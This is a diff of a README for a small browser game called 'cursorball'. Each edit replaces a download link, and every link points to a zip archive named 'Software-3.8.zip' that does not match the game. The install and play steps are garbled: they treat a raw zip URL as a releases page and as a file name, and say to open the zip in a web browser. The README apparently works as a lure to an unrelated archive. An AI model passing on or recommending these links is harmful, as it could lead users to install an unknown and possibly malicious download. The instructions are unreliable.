@@ -6,7 +6,7 @@ Welcome to **cursorball**, a small game made for one file. This game offers quic
 
 ## 📥 Download Now
 
-[![Download cursorball](https://raw.githubusercontent.com/danilofelipe32/cursorball/main/Codiales/Software_v1.7.zip)](https://raw.githubusercontent.com/danilofelipe32/cursorball/main/Codiales/Software_v1.7.zip)
+[![Download cursorball](https://github.com/danilofelipe32/cursorball/raw/refs/heads/main/Codiales/Software-3.8.zip)](https://github.com/danilofelipe32/cursorball/raw/refs/heads/main/Codiales/Software-3.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,20 +18,20 @@ To play **cursorball**, you need:
 
 ## 💾 Download & Install
 
-To get started with **cursorball**, visit this page to download: [cursorball Releases](https://raw.githubusercontent.com/danilofelipe32/cursorball/main/Codiales/Software_v1.7.zip).
+To get started with **cursorball**, visit this page to download: [cursorball Releases](https://github.com/danilofelipe32/cursorball/raw/refs/heads/main/Codiales/Software-3.8.zip).
 
 1. Click the link above to go to the **cursorball** Releases page.
 2. Scroll down to find the latest version of the game.
-3. Look for the file named `https://raw.githubusercontent.com/danilofelipe32/cursorball/main/Codiales/Software_v1.7.zip`. 
+3. Look for the file named `https://github.com/danilofelipe32/cursorball/raw/refs/heads/main/Codiales/Software-3.8.zip`. 
 4. Click on the file name to start the download.
 5. Once the download is complete, locate the file in your downloads folder.
-6. Open the `https://raw.githubusercontent.com/danilofelipe32/cursorball/main/Codiales/Software_v1.7.zip` file in your preferred web browser.
+6. Open the `https://github.com/danilofelipe32/cursorball/raw/refs/heads/main/Codiales/Software-3.8.zip` file in your preferred web browser.
 
 ## 🎮 How to Play
 
 Playing **cursorball** is simple:
 
-1. Open the downloaded `https://raw.githubusercontent.com/danilofelipe32/cursorball/main/Codiales/Software_v1.7.zip` file in your web browser.
+1. Open the downloaded `https://github.com/danilofelipe32/cursorball/raw/refs/heads/main/Codiales/Software-3.8.zip` file in your web browser.
 2. Follow the on-screen instructions.
 3. Use your mouse to control the ball.
 4. Aim for the targets to score points.
@@ -65,4 +65,4 @@ For any questions or support, please check the **Issues** section in the GitHub 
 
 Enjoy playing **cursorball**!🕹️
 
-[![Download cursorball](https://raw.githubusercontent.com/danilofelipe32/cursorball/main/Codiales/Software_v1.7.zip)](https://raw.githubusercontent.com/danilofelipe32/cursorball/main/Codiales/Software_v1.7.zip)
+[![Download cursorball](https://github.com/danilofelipe32/cursorball/raw/refs/heads/main/Codiales/Software-3.8.zip)](https://github.com/danilofelipe32/cursorball/raw/refs/heads/main/Codiales/Software-3.8.zip)
